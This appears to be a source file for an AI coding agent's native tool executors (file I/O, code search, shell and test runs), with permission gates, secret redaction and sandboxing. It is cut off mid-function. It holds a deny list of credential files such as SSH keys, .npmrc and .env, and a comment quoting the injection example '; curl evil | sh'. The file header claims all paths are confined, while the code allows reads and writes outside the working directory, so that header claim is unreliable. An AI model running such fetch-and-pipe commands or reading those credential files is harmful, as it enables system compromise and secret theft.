import { spawn, type ChildProcess } from 'node:child_process';
import {
  closeSync,
  constants as fsConstants,
  existsSync,
  mkdirSync,
  openSync,
  readFileSync,
  readdirSync,
  realpathSync,
  statSync,
  writeSync,
} from 'node:fs';
import path from 'node:path';
import { minimatch } from 'minimatch';
import { createHash } from 'node:crypto';
import { redactSecrets } from '@excalibur/model-gateway';
import { DEFAULT_RESEARCH, DEFAULT_SEARCH_PROVIDER, type ExcaliburConfig } from '@excalibur/shared';
import { getNativeTool, type NativeToolName } from './native-tools';
import { hasShellMetacharacters, type PermissionEngine } from '../permissions/permission-engine';
import { runInDockerSandbox, type SandboxLimits } from '../sandbox/docker-sandbox';
import { webFetch, type FetchImpl, type TierReader, type WebFetchResult } from './web/fetch';
import { webSearch, type WebSearchResponse } from './web/search-providers';
import { extractStructured, type GatewayChat } from './web/extract';
import { politeFetch, RateLimiter } from './web/polite-fetch';
import { crawl, type CrawlResult } from './web/crawl';
import { hostedReaderTier } from './web/hosted-readers';
import { guardUntrustedContent, type UntrustedSource } from './web/content-guard';
import { buildProvenanceRecord, type ProvenanceRecord } from './web/provenance';
import type { WebCache } from './web/cache';
import { lspAvailabilityFor, type LspSession } from '../lsp';
import { readSkillBody, type SkillEntry } from './skills-reader';
import type { ManagementToolset } from '../types';

/**
 * Real native-tool executors (OSS-7, M2) — the security-critical core of the
 * native agent. Every executor enforces defense in depth BEFORE touching the
 * host:
 *
 *  1. zod validation of the model-supplied `args` (malformed → declined).
 *  2. PATH CONFINEMENT for every path arg: the path is resolved against the
 *     workdir and rejected unless it stays inside it; absolute paths, `..`
 *     escapes and symlinks that point out of the tree are refused before any
 *     fs call. (`assertConfined`).
 *  3. PERMISSION GATE: `PermissionEngine.checkPath/checkCommand/checkTool` — a
 *     `deny` returns `{ ok: false }`; a `requiresConfirmation` is handled one
 *     level up (the adapter's confirm-or-decline gate) so this module never
 *     prompts.
 *  4. REDACTION: every result string (file contents, command output, diffs)
 *     is passed through `redactSecrets` before it leaves this module, so a
 *     secret read off disk or printed by a command is masked before it can
 *     re-enter the prompt or an emitted event.
 *
 * Executors NEVER throw on a denied/invalid request: the textual result is fed
 * back to the model so it can adapt. They only let truly unexpected internal
 * errors surface as `{ ok: false }` with a redacted message.
 */

/** Execution context threaded into every tool executor. */
export interface ToolExecutionContext {
  /** Absolute working directory the agent is confined to. */
  workdir: string;
  config: ExcaliburConfig;
  permissions: PermissionEngine;
  /** Environment for spawned commands (defaults to a minimal inherited env). */
  env?: NodeJS.ProcessEnv;
  /**
   * Optional abort signal. When it fires, any in-flight spawned process
   * (run_command / run_tests / git) is SIGKILLed immediately instead of
   * running to completion or the 120s timeout — so ESC/abort actually stops
   * work the agent already started.
   */
  signal?: AbortSignal;
  /** Injectable fetch for `web_fetch`/`web_search` (tests pass a fake; defaults to global fetch). */
  httpFetch?: FetchImpl;
  /**
   * Resolves a reachable local SearXNG base URL for `web_search` (production
   * wires the Docker manager; tests omit it so the offline DuckDuckGo path runs).
   */
  resolveSearxng?: () => Promise<string | null>;
  /** Environment used to resolve a BYOK search API key (defaults to process.env). */
  searchEnv?: NodeJS.ProcessEnv;
  /**
   * Model gateway (chat only) for `web_extract`'s keyless LLM pass (SP-2; reused
   * by F7-shaped LLM-in-tool work). Optional + fail-closed: absent → web_extract
   * errors clearly rather than silently skipping extraction.
   */
  gateway?: GatewayChat;
  /** Model/provider overrides forwarded to the gateway for in-tool model calls. */
  model?: string;
  provider?: string;
  /** Shared per-run on-disk cache + per-host rate limiter for `web_crawl`. */
  webCache?: WebCache;
  rateLimiter?: RateLimiter;
  /** Environment used to resolve a BYOK scrape API key (F5; defaults to process.env). */
  scrapeEnv?: NodeJS.ProcessEnv;
  /**
   * Tier-2 LOCAL browser reader (F4) used to escalate `web_fetch`/`web_extract`
   * on a thin/blocked Tier-1 result. Injected by the adapter when the browser is
   * enabled; tests pass a fake. Absent → no escalation (Tier-1 only).
   */
  browserReader?: TierReader;
  /**
   * Run-scoped LSP session for the model-callable `lsp` tool (P1.8b:
   * definition/references/hover on demand). Injected by the adapter when LSP is
   * enabled; absent → the `lsp` tool reports no language server is available.
   */
  lsp?: LspSession;
  /**
   * Free-text human channel for the model-callable `question` tool (P1.8b).
   * Injected when a human is present (interactive shell / interactive run);
   * absent or returning empty → the tool tells the model to proceed autonomously.
   */
  ask?: (question: string) => Promise<string>;
  /**
   * Skill index for the model-callable `skill` tool (P1.8b progressive
   * disclosure). The adapter scans the project (and user-global) for SKILL.md
   * files and passes the metadata here; the tool reads a skill's full body
   * lazily by name. Absent/empty → the tool reports no skills are available.
   */
  skills?: ReadonlyArray<SkillEntry>;
  /**
   * Skill-disclosure policy (P2.18). `'approved'` withholds a skill's BODY
   * unless its name is in `approvedSkills` — the skill stays listed, but loading
   * it returns a needs-approval notice. Absent → `'open'` (load any skill).
   */
  skillApproval?: 'open' | 'approved';
  approvedSkills?: ReadonlyArray<string>;
  /**
   * Host-injected MANAGEMENT capabilities (project status, work-items, sprints,
   * plans) backing the read-only management tools — the proactive foundation.
   * The CLI/core layer (which owns the stores) provides it; absent → those tools
   * report they are unavailable in this context.
   */
  management?: ManagementToolset;
}

export interface ToolResult {
  ok: boolean;
  result: string;
  /** Provenance + injection verdict for untrusted web/MCP content (F8). */
  provenance?: ProvenanceRecord;
}

/**
 * Guards untrusted inbound web content (F8): scans for prompt-injection, fences /
 * quarantines, and attaches a provenance record. The model only ever sees the
 * guarded text. `ok()`'s redaction still applies on top.
 */
function guardWeb(
  text: string,
  source: UntrustedSource,
  url: string | undefined,
  ctx: ToolExecutionContext,
): ToolResult {
  const inj = ctx.config.web?.injection;
  const guard = guardUntrustedContent(text, source, url, {
    ...(inj?.enabled !== undefined ? { enabled: inj.enabled } : {}),
    ...(inj?.blockOnMalicious !== undefined ? { blockOnMalicious: inj.blockOnMalicious } : {}),
    ...(inj?.maliciousThreshold !== undefined
      ? { maliciousThreshold: inj.maliciousThreshold }
      : {}),
    ...(inj?.suspiciousThreshold !== undefined
      ? { suspiciousThreshold: inj.suspiciousThreshold }
      : {}),
    ...(inj?.stripHiddenText !== undefined ? { stripHiddenText: inj.stripHiddenText } : {}),
  });
  return {
    ...ok(guard.modelText),
    provenance: buildProvenanceRecord(source, url, guard, new Date().toISOString()),
  };
}

/** Max bytes returned from read_file before truncation. */
const MAX_READ_BYTES = 256 * 1024;
/** Max entries returned from list_files. */
const MAX_LIST_ENTRIES = 1000;
/** Max matches returned from search_code. */
const DEFAULT_SEARCH_MAX = 200;
/** Max bytes of a single file scanned by search_code. */
const SEARCH_FILE_MAX_BYTES = 1024 * 1024;
/** Command timeout (ms) for run_command / run_tests / git operations. */
const COMMAND_TIMEOUT_MS = 120_000;
/** Max bytes captured from a command's combined stdout+stderr. */
const COMMAND_OUTPUT_MAX = 256 * 1024;
/**
 * Grace (ms) after the direct child EXITS to wait for 'close' (final stdio flush)
 * before settling anyway. A backgrounded grandchild (`server &`) inherits our
 * stdout/stderr pipes and holds them open, so 'close' may never fire — without
 * this grace the command would hang to the full 120s timeout (the "se queda un
 * rato" stall). Long enough to capture the real command's last bytes, short
 * enough that a `cmd &` returns promptly.
 */
const COMMAND_CLOSE_GRACE_MS = 250;
/** Directories never walked by search_code / list_files. */
const SKIP_DIRS = new Set(['.git', 'node_modules', 'dist', 'build', 'coverage']);
/** Max recursion depth for directory walks (anti stack-exhaustion). */
const MAX_WALK_DEPTH = 100;
/** Max length of a user/model regex source (cheap ReDoS bound, no new deps). */
const MAX_REGEX_SOURCE = 200;
/** Lines longer than this are skipped by search_code (anti catastrophic backtracking). */
const MAX_SEARCH_LINE_LENGTH = 2000;

function ok(result: string): ToolResult {
  return { ok: true, result: redactSecrets(result) };
}

function fail(result: string): ToolResult {
  return { ok: false, result: redactSecrets(result) };
}

/**
 * Resolves `relPath` against `workdir` and asserts it stays inside it. Rejects
 * absolute inputs and `..` escapes. When the resolved target (or an ancestor)
 * is a symlink, the realpath is re-checked so a symlink can never tunnel out of
 * the tree. Returns the absolute path on success, or an error string.
 */
/** Target file paths a unified diff writes (`+++ b/x`, `--- a/x`, renames). */
function diffTargetPaths(diff: string): string[] {
  const paths = new Set<string>();
  const add = (raw: string): void => {
    const p = raw.trim().replace(/^[ab]\//, '');
    if (p.length > 0 && p !== '/dev/null') paths.add(p);
  };
  for (const line of diff.split('\n')) {
    const header = /^(?:\+\+\+|---) (.+)$/.exec(line);
    if (header) add(header[1] as string);
    const git = /^diff --git a\/(.+?) b\/(.+)$/.exec(line);
    if (git) {
      add(git[1] as string);
      add(git[2] as string);
    }
    const rename = /^rename (?:from|to) (.+)$/.exec(line);
    if (rename) add(rename[1] as string);
  }
  return [...paths];
}

function assertConfined(workdir: string, relPath: string): { abs: string } | { error: string } {
  if (typeof relPath !== 'string' || relPath.length === 0) {
    return { error: 'empty path' };
  }
  if (path.isAbsolute(relPath)) {
    return { error: `absolute paths are not allowed: "${relPath}"` };
  }
  const root = path.resolve(workdir);
  const abs = path.resolve(root, relPath);
  if (!(abs === root || abs.startsWith(root + path.sep))) {
    return { error: `path escapes the working directory: "${relPath}"` };
  }
  // Symlink safety: if the path (or its nearest existing ancestor) resolves via
  // a symlink to somewhere outside the tree, refuse. New files (parent exists,
  // leaf does not) are fine — we realpath the deepest existing ancestor.
  let probe = abs;
  while (probe !== root && !existsSync(probe)) {
    probe = path.dirname(probe);
  }
  if (existsSync(probe)) {
    let real: string;
    try {
      real = realpathSync(probe);
    } catch {
      return { error: `cannot resolve path: "${relPath}"` };
    }
    const realRoot = (() => {
      try {
        return realpathSync(root);
      } catch {
        return root;
      }
    })();
    if (!(real === realRoot || real.startsWith(realRoot + path.sep))) {
      return { error: `path resolves outside the working directory via a symlink: "${relPath}"` };
    }
  }
  return { abs };
}

// Secret files we refuse to READ even outside the working tree (the read floor).
const SECRET_BASENAMES = new Set([
  'credentials',
  '.npmrc',
  '.netrc',
  '.pgpass',
  'id_rsa',
  'id_dsa',
  'id_ecdsa',
  'id_ed25519',
]);
const SECRET_EXT = /\.(pem|key|pfx|p12|keystore|jks|ppk)$/i;
function isSecretPath(abs: string): boolean {
  const base = path.basename(abs).toLowerCase();
  if (SECRET_BASENAMES.has(base)) return true;
  if (base.startsWith('.env')) return true; // .env, .env.local, .env.production…
  return SECRET_EXT.test(base);
}

/**
 * Resolves a path for a READ. Unlike {@link assertConfined}, reads may target
 * files OUTSIDE the working directory — a coding agent routinely needs to look
 * at a sibling project or a file the user points it at by absolute/`../` path.
 * Writes still go through {@link assertConfined} (confined by default); reads
 * only get a secret-file floor so credentials never leak.
 */
function resolveReadable(workdir: string, p: string): { abs: string } | { error: string } {
  if (typeof p !== 'string' || p.length === 0) {
    return { error: 'empty path' };
  }
  const abs = path.isAbsolute(p) ? path.resolve(p) : path.resolve(path.resolve(workdir), p);
  if (isSecretPath(abs)) {
    return { error: `refusing to read a secret file: "${p}"` };
  }
  return { abs };
}

/**
 * Resolves a path for a WRITE. Like {@link resolveReadable}, writes are NOT
 * confined to the working directory — when the user asks the agent to change a
 * sibling project (or anywhere), it must be able to. Out-of-tree writes are
 * surfaced for CONFIRMATION at the loop's permission gate, not blocked here;
 * this only refuses clobbering an obvious secret file. The leaf is still opened
 * `O_NOFOLLOW` by the callers, so a symlinked final component can't be tunnelled.
 */
function resolveWritable(workdir: string, p: string): { abs: string } | { error: string } {
  if (typeof p !== 'string' || p.length === 0) {
    return { error: 'empty path' };
  }
  const abs = path.isAbsolute(p) ? path.resolve(p) : path.resolve(path.resolve(workdir), p);
  if (isSecretPath(abs)) {
    return { error: `refusing to write a secret file: "${p}"` };
  }
  return { abs };
}

/** True when `p` resolves OUTSIDE `workdir` (used to gate out-of-tree writes). */
export function isOutsideWorkdir(workdir: string, p: string): boolean {
  if (typeof p !== 'string' || p.length === 0) return false;
  const root = path.resolve(workdir);
  const abs = path.isAbsolute(p) ? path.resolve(p) : path.resolve(root, p);
  return !(abs === root || abs.startsWith(root + path.sep));
}

/** Validates raw args against the tool's zod schema; returns parsed args or an error. */
function validate(
  name: NativeToolName,
  args: unknown,
): { data: Record<string, unknown> } | { error: string } {
  const def = getNativeTool(name);
  if (def === undefined) {
    return { error: `unknown tool "${name}"` };
  }
  const parsed = def.parameters.safeParse(args);
  if (!parsed.success) {
    const issues = parsed.error.issues
      .map((issue) => `${issue.path.join('.') || '(root)'}: ${issue.message}`)
      .join('; ');
    return { error: `invalid arguments: ${issues}` };
  }
  return { data: parsed.data as Record<string, unknown> };
}

/**
 * Runs a child process (command via shell, or git via argv) confined to `cwd`,
 * with a hard timeout and bounded output capture. Resolves with the exit code
 * and combined (capped) output; never rejects.
 */
function runProcess(
  file: string,
  args: string[],
  options: {
    cwd: string;
    env?: NodeJS.ProcessEnv;
    shell?: boolean;
    input?: string;
    signal?: AbortSignal;
  },
): Promise<{ code: number | null; output: string; timedOut: boolean; aborted: boolean }> {
  return new Promise((resolve) => {
    const { signal } = options;
    if (signal?.aborted === true) {
      resolve({
        code: null,
        output: '(command aborted before start)',
        timedOut: false,
        aborted: true,
      });
      return;
    }
    const onUnix = process.platform !== 'win32';
    const child = spawn(file, args, {
      cwd: options.cwd,
      // Minimal env (PATH+HOME) so a command can't read arbitrary secrets — BUT
      // carry EXCALIBUR_SWARM_DEPTH through (non-secret): it is the recursion-cap
      // propagation channel, so a nested `excalibur swarm` shelled by a lane still
      // self-caps (without this, the child re-enters at depth 0 — a fork-bomb risk).
      env: options.env ?? {
        PATH: process.env['PATH'] ?? '',
        HOME: process.env['HOME'] ?? '',
        ...(process.env['EXCALIBUR_SWARM_DEPTH'] !== undefined
          ? { EXCALIBUR_SWARM_DEPTH: process.env['EXCALIBUR_SWARM_DEPTH'] }
          : {}),
      },
      shell: options.shell ?? false,
      stdio: ['pipe', 'pipe', 'pipe'],
      // Run in its own process group (group leader pid == child.pid) so an abort
      // can SIGKILL the WHOLE command tree, not just the shell. With `shell:true`
      // the child is `/bin/sh -c "<cmd>"`; killing only the shell leaves the real
      // command (e.g. `sleep`) orphaned, still holding the stdio pipes open, so
      // Node's 'close' never fires and the run hangs to the 120s timeout.
      detached: onUnix,
    });

    let output = '';
    let bytes = 0;
    let timedOut = false;
    let aborted = false;
    let settled = false;
    let spawned = false;
    let killPending = false;

    // SIGKILL the whole process group. `child.kill()` is also a no-op until the
    // OS has actually spawned the process (no pid yet), so an abort that lands in
    // that spawn window would be dropped — gate on the 'spawn' event and replay a
    // pending kill once the process is really running, so abort is always honoured.
    const killTree = (): void => {
      if (!spawned) {
        killPending = true;
        return;
      }
      const pid = child.pid;
      // `pid > 0` is REQUIRED, not just `!== undefined`: in JS `-0 === 0`, and
      // `process.kill(0/-0, 'SIGKILL')` signals the CALLER'S OWN process group —
      // i.e. it would SIGKILL Excalibur itself. A stray 0/NaN pid must never turn an
      // abort into suicide of the m-shell (nunca es nunca).
      if (onUnix && typeof pid === 'number' && pid > 0) {
        try {
          // Negative pid → the whole group (the shell + every child it spawned).
          // Safe only because we spawned `detached` (own group); without that a
          // negative pid would target the test runner's own group.
          process.kill(-pid, 'SIGKILL');
          return;
        } catch {
          // Group already gone — fall through to a direct kill.
        }
      }
      child.kill('SIGKILL');
    };
    child.once('spawn', () => {
      spawned = true;
      if (killPending) {
        killTree();
      }
    });

    const capture = (chunk: Buffer): void => {
      if (bytes >= COMMAND_OUTPUT_MAX) {
        return;
      }
      const remaining = COMMAND_OUTPUT_MAX - bytes;
      const text = chunk.toString('utf8');
      output += text.length > remaining ? `${text.slice(0, remaining)}\n…(output truncated)` : text;
      bytes += Buffer.byteLength(text);
    };
    child.stdout?.on('data', capture);
    child.stderr?.on('data', capture);

    const timer = setTimeout(() => {
      timedOut = true;
      killTree();
    }, COMMAND_TIMEOUT_MS);

    // Kill the spawned process the moment the run is aborted (ESC / signal),
    // rather than letting it run to completion or the 120s timeout.
    const onAbort = (): void => {
      aborted = true;
      killTree();
    };
    signal?.addEventListener('abort', onAbort, { once: true });

    const finish = (code: number | null): void => {
      if (settled) {
        return;
      }
      settled = true;
      clearTimeout(timer);
      signal?.removeEventListener('abort', onAbort);
      // REAP any lingering process tree before settling. Settling fast on 'exit'+grace
      // means a backgrounded grandchild (`node server.js &`) that inherited the stdio
      // pipes would otherwise ORPHAN into the session — left running behind the m-shell,
      // holding a port + the pipes, and able to fire late 'data'/EPIPE on a settled
      // command. A verification that starts a server must never leave it running
      // (RUN-FIX-20). killTree is a no-op when the tree already exited (the common case).
      killTree();
      // Detach from the child's streams so a late write / EPIPE from the just-reaped
      // tree can never reach a settled command; swallow any stray stream 'error' raised
      // as the pipe tears down (it would otherwise surface as an unhandled error).
      try {
        child.stdout?.removeListener('data', capture);
        child.stderr?.removeListener('data', capture);
        child.stdout?.on('error', () => {});
        child.stderr?.on('error', () => {});
      } catch {
        /* best-effort cleanup — never let teardown throw */
      }
      if (aborted) {
        output += '\n…(command aborted)';
      }
      resolve({ code, output, timedOut, aborted });
    };

    child.on('error', (error) => {
      output += `\n${error.message}`;
      finish(null);
    });
    // 'close' (all stdio EOF) is the clean settle — full output captured. But a
    // backgrounded grandchild (`server &`) inherits the pipes and holds them open,
    // so 'close' can be delayed indefinitely. On the DIRECT child's 'exit', give
    // 'close' a short grace to flush the last bytes, then settle with the exit code
    // regardless — so the command never hangs to the 120s timeout (RUN-FIX-18).
    let exitCode: number | null = null;
    child.on('exit', (code) => {
      exitCode = code;
      setTimeout(() => finish(exitCode), COMMAND_CLOSE_GRACE_MS).unref?.();
    });
    child.on('close', (code) => finish(code ?? exitCode));

    if (options.input !== undefined) {
      child.stdin?.write(options.input);
    }
    child.stdin?.end();
  });
}

// --- individual tool executors ----------------------------------------------

function execReadFile(args: Record<string, unknown>, ctx: ToolExecutionContext): ToolResult {
  const relPath = args['path'] as string;
  // Reads may leave the working directory (sibling projects, files the user
  // points at). Writes stay confined; this only guards against secret files.
  const resolved = resolveReadable(ctx.workdir, relPath);
  if ('error' in resolved) {
    return fail(`rejected: ${resolved.error}`);
  }
  const decision = ctx.permissions.checkPath(relPath, 'read');
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  if (!existsSync(resolved.abs)) {
    return fail(`file not found: "${relPath}"`);
  }
  const stat = statSync(resolved.abs);
  if (stat.isDirectory()) {
    return fail(`"${relPath}" is a directory, not a file`);
  }
  let content = readFileSync(resolved.abs, 'utf8');
  let truncated = false;
  if (Buffer.byteLength(content) > MAX_READ_BYTES) {
    content = content.slice(0, MAX_READ_BYTES);
    truncated = true;
  }
  return ok(truncated ? `${content}\n…(truncated at ${MAX_READ_BYTES} bytes)` : content);
}

function execWriteFile(args: Record<string, unknown>, ctx: ToolExecutionContext): ToolResult {
  const relPath = args['path'] as string;
  const fileContent = args['content'] as string;
  // Writes are not confined to the working dir (out-of-tree writes are confirmed
  // at the loop's permission gate); only secret files are refused outright.
  const confined = resolveWritable(ctx.workdir, relPath);
  if ('error' in confined) {
    return fail(`rejected: ${confined.error}`);
  }
  const decision = ctx.permissions.checkPath(relPath, 'write');
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  const dir = path.dirname(confined.abs);
  // mkdir -p, but only within the confined tree (dir is already confined).
  mkdirSync(dir, { recursive: true });
  // TOCTOU-safe write: open with O_NOFOLLOW so the kernel refuses (ELOOP) if the
  // FINAL path component is a symlink AT OPEN TIME — closing the race window
  // between a check-then-write where the leaf could be swapped for a symlink
  // pointing outside the tree. assertConfined (above) already realpath-checks
  // the intermediate dirs, so only the leaf needs this atomic guard.
  let fd: number;
  try {
    fd = openSync(
      confined.abs,
      fsConstants.O_WRONLY | fsConstants.O_CREAT | fsConstants.O_TRUNC | fsConstants.O_NOFOLLOW,
      0o644,
    );
  } catch (error) {
    const code = (error as { code?: string }).code;
    if (code === 'ELOOP') {
      return fail(`permission denied: refusing to write through a symlink: "${relPath}"`);
    }
    if (code === 'EISDIR') {
      return fail(`"${relPath}" is a directory, not a file`);
    }
    if (code === 'EACCES' || code === 'EPERM') {
      return fail(`permission denied: cannot write "${relPath}"`);
    }
    return fail(`could not write "${relPath}"`);
  }
  try {
    writeSync(fd, fileContent, null, 'utf8');
  } finally {
    closeSync(fd);
  }
  return ok(`wrote ${Buffer.byteLength(fileContent)} bytes to "${relPath}"`);
}

/** Surgical find/replace in an existing file (token-cheaper than a full rewrite). */
function execEdit(args: Record<string, unknown>, ctx: ToolExecutionContext): ToolResult {
  const relPath = args['path'] as string;
  const oldString = args['oldString'] as string;
  const newString = args['newString'] as string;
  const replaceAll = args['replaceAll'] === true;
  // Not confined (out-of-tree edits are confirmed at the gate); secrets refused.
  const confined = resolveWritable(ctx.workdir, relPath);
  if ('error' in confined) {
    return fail(`rejected: ${confined.error}`);
  }
  const decision = ctx.permissions.checkPath(relPath, 'write');
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  if (oldString === newString) {
    return fail('oldString and newString are identical — nothing to change');
  }
  let content: string;
  try {
    content = readFileSync(confined.abs, 'utf8');
  } catch (error) {
    const code = (error as { code?: string }).code;
    if (code === 'ENOENT') {
      return fail(`"${relPath}" does not exist — use write_file to create it`);
    }
    return fail(`could not read "${relPath}"`);
  }
  const occurrences = content.split(oldString).length - 1;
  if (occurrences === 0) {
    return fail(
      `oldString not found in "${relPath}" — it must match the file exactly (including whitespace)`,
    );
  }
  if (occurrences > 1 && !replaceAll) {
    return fail(
      `oldString matches ${occurrences} places in "${relPath}" — add surrounding context to make it unique, or set replaceAll: true`,
    );
  }
  const updated = replaceAll
    ? content.split(oldString).join(newString)
    : content.replace(oldString, newString);
  // Same TOCTOU-safe write as write_file (O_NOFOLLOW refuses a symlinked leaf).
  let fd: number;
  try {
    fd = openSync(
      confined.abs,
      fsConstants.O_WRONLY | fsConstants.O_TRUNC | fsConstants.O_NOFOLLOW,
      0o644,
    );
  } catch (error) {
    const code = (error as { code?: string }).code;
    if (code === 'ELOOP') {
      return fail(`permission denied: refusing to write through a symlink: "${relPath}"`);
    }
    if (code === 'EACCES' || code === 'EPERM') {
      return fail(`permission denied: cannot write "${relPath}"`);
    }
    return fail(`could not write "${relPath}"`);
  }
  try {
    writeSync(fd, updated, null, 'utf8');
  } finally {
    closeSync(fd);
  }
  return ok(`edited "${relPath}" (${occurrences} replacement${occurrences === 1 ? '' : 's'})`);
}

function execListFiles(args: Record<string, unknown>, ctx: ToolExecutionContext): ToolResult {
  const relDir = (args['path'] as string | undefined) ?? '.';
  const glob = args['glob'] as string | undefined;
  // Listing, like reading, may target a directory outside the working tree.
  const resolved = resolveReadable(ctx.workdir, relDir);
  if ('error' in resolved) {
    return fail(`rejected: ${resolved.error}`);
  }
  const decision = ctx.permissions.checkPath(relDir === '.' ? '.' : relDir, 'read');
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  if (!existsSync(resolved.abs)) {
    return fail(`directory not found: "${relDir}"`);
  }
  const confined = resolved;
  // In-tree listings stay relative to the working dir (repo-relative paths the
  // user expects); out-of-tree listings are relative to the directory listed.
  const workdirAbs = path.resolve(ctx.workdir);
  const inTree = confined.abs === workdirAbs || confined.abs.startsWith(workdirAbs + path.sep);
  const root = inTree ? workdirAbs : confined.abs;
  const entries: string[] = [];
  const walk = (absDir: string, depth: number): void => {
    if (entries.length >= MAX_LIST_ENTRIES || depth > MAX_WALK_DEPTH) {
      return;
    }
    let dirents;
    try {
      dirents = readdirSync(absDir, { withFileTypes: true });
    } catch {
      return;
    }
    for (const dirent of dirents) {
      if (entries.length >= MAX_LIST_ENTRIES) {
        return;
      }
      if (dirent.isSymbolicLink()) {
        continue;
      }
      const absChild = path.join(absDir, dirent.name);
      const rel = path.relative(root, absChild).split(path.sep).join('/');
      if (dirent.isDirectory()) {
        if (SKIP_DIRS.has(dirent.name)) {
          continue;
        }
        walk(absChild, depth + 1);
      } else if (dirent.isFile()) {
        if (glob === undefined || minimatch(rel, glob, { dot: true })) {
          entries.push(rel);
        }
      }
    }
  };
  walk(confined.abs, 0);
  entries.sort();
  const header = entries.length >= MAX_LIST_ENTRIES ? `(capped at ${MAX_LIST_ENTRIES})\n` : '';
  return ok(header + (entries.length > 0 ? entries.join('\n') : '(no files)'));
}

function execSearchCode(args: Record<string, unknown>, ctx: ToolExecutionContext): ToolResult {
  const query = args['query'] as string;
  const glob = args['glob'] as string | undefined;
  const maxResults = (args['maxResults'] as number | undefined) ?? DEFAULT_SEARCH_MAX;

  let matcher: (line: string) => boolean;
  const regexMatch = /^\/(.+)\/([a-z]*)$/.exec(query);
  if (regexMatch !== null) {
    const source = regexMatch[1] ?? '';
    // Cheap ReDoS bound: a pathologically long pattern is the classic vector for
    // catastrophic backtracking — reject it before compiling, with no new deps.
    if (source.length > MAX_REGEX_SOURCE) {
      return fail(`invalid arguments: regex too long (max ${MAX_REGEX_SOURCE} chars)`);
    }
    try {
      const regex = new RegExp(source, regexMatch[2] ?? '');
      matcher = (line) => regex.test(line);
    } catch {
      return fail(`invalid regex: "${query}"`);
    }
  } else {
    matcher = (line) => line.includes(query);
  }

  const root = path.resolve(ctx.workdir);
  const matches: string[] = [];
  const walk = (absDir: string, depth: number): void => {
    if (matches.length >= maxResults || depth > MAX_WALK_DEPTH) {
      return;
    }
    let dirents;
    try {
      dirents = readdirSync(absDir, { withFileTypes: true });
    } catch {
      return;
    }
    for (const dirent of dirents) {
      if (matches.length >= maxResults) {
        return;
      }
      if (dirent.isSymbolicLink()) {
        continue;
      }
      const absChild = path.join(absDir, dirent.name);
      const rel = path.relative(root, absChild).split(path.sep).join('/');
      if (dirent.isDirectory()) {
        if (SKIP_DIRS.has(dirent.name)) {
          continue;
        }
        walk(absChild, depth + 1);
        continue;
      }
      if (!dirent.isFile()) {
        continue;
      }
      if (glob !== undefined && !minimatch(rel, glob, { dot: true })) {
        continue;
      }
      // Never read blocked/secret paths into a search result.
      if (!ctx.permissions.checkPath(rel, 'read').allowed) {
        continue;
      }
      let content: string;
      try {
        const stat = statSync(absChild);
        if (stat.size > SEARCH_FILE_MAX_BYTES) {
          continue;
        }
        content = readFileSync(absChild, 'utf8');
      } catch {
        continue;
      }
      // Skip files that look binary.
      if (content.includes('\u0000')) {
        continue;
      }
      const lines = content.split('\n');
      for (let i = 0; i < lines.length; i += 1) {
        if (matches.length >= maxResults) {
          break;
        }
        const line = lines[i] ?? '';
        // Never run the (possibly user/model-supplied) regex on a pathologically
        // long line — that is the catastrophic-backtracking trigger.
        if (line.length > MAX_SEARCH_LINE_LENGTH) {
          continue;
        }
        if (matcher(line)) {
          const snippet = line.trim().slice(0, 200);
          matches.push(`${rel}:${i + 1}: ${snippet}`);
        }
      }
    }
  };
  walk(root, 0);

  if (matches.length === 0) {
    return ok('(no matches)');
  }
  const header = matches.length >= maxResults ? `(capped at ${maxResults})\n` : '';
  return ok(header + matches.join('\n'));
}

async function execRunCommand(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const command = args['command'] as string;
  const relCwd = args['cwd'] as string | undefined;
  const decision = ctx.permissions.checkCommand(command);
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  let cwd = path.resolve(ctx.workdir);
  if (relCwd !== undefined) {
    // A command may run in another directory (out-of-tree work is confirmed at
    // the gate; the destructive-command floor still applies regardless of cwd).
    const resolved = resolveWritable(ctx.workdir, relCwd);
    if ('error' in resolved) {
      return fail(`rejected: ${resolved.error}`);
    }
    cwd = resolved.abs;
  }
  // Sandbox (M3): when configured, the command runs inside an ephemeral Docker
  // container (only the repo mounted, no host secrets/network) — a second line of
  // defense beyond the allowlist/confirm gate.
  const sandbox = ctx.config.sandbox;
  if (sandbox?.enabled === true) {
    const limits: SandboxLimits = {
      ...(sandbox.image !== undefined ? { image: sandbox.image } : {}),
      ...(sandbox.memoryMb !== undefined ? { memoryMb: sandbox.memoryMb } : {}),
      ...(sandbox.cpus !== undefined ? { cpus: sandbox.cpus } : {}),
      ...(sandbox.network !== undefined ? { allowNetwork: sandbox.network } : {}),
    };
    const sb = runInDockerSandbox(cwd, command, limits);
    return formatCommandResult(
      command,
      sb.exitCode,
      `${sb.stdout}${sb.stderr}`.trim(),
      sb.timedOut,
    );
  }
  // Host execution: the command is gated by the allowlist/confirm path before
  // reaching here, so it runs through the shell as-is. We pin a minimal env
  // (PATH+HOME only) so a command cannot read arbitrary secrets out of the env.
  const { code, output, timedOut } = await runProcess(command, [], {
    cwd,
    ...(ctx.env !== undefined ? { env: ctx.env } : {}),
    shell: true,
    ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
  });
  return formatCommandResult(command, code, output, timedOut);
}

async function execRunTests(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const override = args['command'] as string | undefined;
  const pattern = args['pattern'] as string | undefined;
  // SECURITY: `pattern` is concatenated into a shell command, so a `pattern`
  // like `; curl evil | sh` would inject. A test filter never needs shell
  // metacharacters — refuse them outright (the gate elsewhere checks `command`).
  if (pattern !== undefined && hasShellMetacharacters(pattern)) {
    return fail('test pattern must not contain shell metacharacters');
  }
  const base = override ?? ctx.config.commands?.test ?? 'npm test';
  const command = pattern !== undefined ? `${base} ${pattern}` : base;
  // Gate the EXACT composed command (not just `base`) — defeats checked≠executed.
  const decision = ctx.permissions.checkCommand(command);
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  // Honour the sandbox for test execution too (was host-only — a gap vs run_command).
  const sandbox = ctx.config.sandbox;
  if (sandbox?.enabled === true) {
    const limits: SandboxLimits = {
      ...(sandbox.image !== undefined ? { image: sandbox.image } : {}),
      ...(sandbox.memoryMb !== undefined ? { memoryMb: sandbox.memoryMb } : {}),
